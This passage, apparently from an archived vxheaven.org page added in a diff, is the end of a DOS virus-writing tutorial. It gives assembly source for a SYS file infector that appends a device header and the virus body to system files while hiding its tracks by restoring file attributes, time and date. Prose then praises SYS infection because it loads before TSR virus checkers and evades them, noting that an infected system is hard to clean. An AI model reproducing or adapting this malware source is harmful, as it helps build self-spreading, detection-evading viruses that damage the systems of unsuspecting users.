+          pop     bx
+          pop     ax
+          pop     bp
+          iret
+
+  continueSYS:
+          push    ds
+          pop     es
+
+          lea     si, [bp+offset header]
+          lea     di, [bp+offset bigbuffer]
+          mov     cx, offset endheader - offset header
+          rep     movsb
+
+          mov     cx, cs:[bp+filesize]
+          add     cx, offset _strategy - offset header  ; calculate offset to
+          mov     word ptr [bp+bigbuffer+6],cx            ; strategy routine
+
+          add     cx, offset _interrupt - offset _strategy;calculate offset to
+          mov     word ptr cs:[bp+bigbuffer+8], cx        ; interrupt routine
+
+  continueinfection:
+          mov     ax, 4300h               ; get file attributes
+          lea     dx, [bp+filename]
+          int     21h
+
+          push    cx                      ; save attributes on stack
+          push    dx                      ; save filename on stack
+
+          mov     ax, 4301h               ; clear file attributes
+          xor     cx, cx
+          lea     dx,[bp+filename]
+          int     21h
+
+          call    openreadwrite
+
+          mov     ax, 5700h               ; get file time/date
+          int     21h
+          push    cx                      ; save them on stack
+          push    dx
+
+          mov     ah, 40h                 ; write filesize to the old
+          mov     cx, 2                   ; SYS header
+          lea     dx, [bp+filesize]
+          int     21h
+
+          mov     ax, 4202h               ; go to end of file
+          xor     cx, cx
+          cwd                             ; xor dx, dx
+          int     21h
+
+          mov     ah, 40h                 ; concatenate header
+          mov     cx, offset endheader - offset header
+          lea     dx, [bp+bigbuffer]
+          int     21h
+
+          mov     ah, 40h                 ; concatenate virus
+          mov     cx, offset heap - offset endheader
+          lea     dx, [bp+endheader]
+          int     21h
+
+          mov     ax, 5701h               ; restore file time/date
+          pop     dx
+          pop     cx
+          int     21h
+
+          mov     ah, 3eh                 ; close file
+          int     21h
+
+          mov     ax, 4301h               ; restore file attributes
+          pop     cx
+          pop     dx
+          int     21h
+
+          jmp     bombout
+
+  openreadwrite:
+          mov     al, 2                   ; open read/write mode
+  open:   mov     ah, 3dh
+          lea     dx,[bp+filename]
+          int     21h
+          xchg    ax, bx                  ; put handle in bx
+          ret
+
+  heap:
+  savebx   dw      ?
+  savees   dw      ?
+  buffer   db      2 dup (?)
+  filename db     13 dup (?)
+  filesize dw     ?
+  bigbuffer db    offset endheader - offset header dup (?)
+  endheap:
+
+  end header
+  ---------------------------------------------------------------------------
+</pre>
+<p>The reason the "delta offset" is needed throughout the file is because it is impossible to know the exact location where the SYS file will be loaded into memory. This can be ameliorated by some file padding and fancy mathematical calculations.</p>
+<p>The advantages of using SYS files are manyfold. There is no load high routine involved apart from the strategy/interrupt routines. This saves space. SYS files also generally load before TSR virus checkers. TSR checkers also can't detect the residency routine of the virus, since it is a normal part of the DOS loading process. The routine for the infection of the SYS file is ridiculously easy to implement and takes remarkably little space, so there is no reason not to include SYS support in viruses. Finally, the memory "loss" reported by CHKDSK usually associated with memory resident viruses is not a problem with SYS files.</p>
+<p>A SYS file infector, when combined with a COM and EXE general infector, can lead to a powerful virus. Once the first SYS file is infected, the infected system becomes extremely vulnerable to the virus, as there is little the user can do to prevent the virus from running, short of a clean boot.</p>
+[<a style="" href="/lib/?lang=EN&amp;index=DO#vda02">Back to index</a>] [<a href="/lib/vda02.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vda02">de</a><a href="/lib/index.php?lang=en&amp;id=vda02">en</a><a href="/lib/index.php?lang=es&amp;id=vda02">es</a><a href="/lib/index.php?lang=it&amp;id=vda02">it</a><a href="/lib/index.php?lang=fr&amp;id=vda02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vda02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vda02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vda02">ua</a></div>
+</body>
+</html>
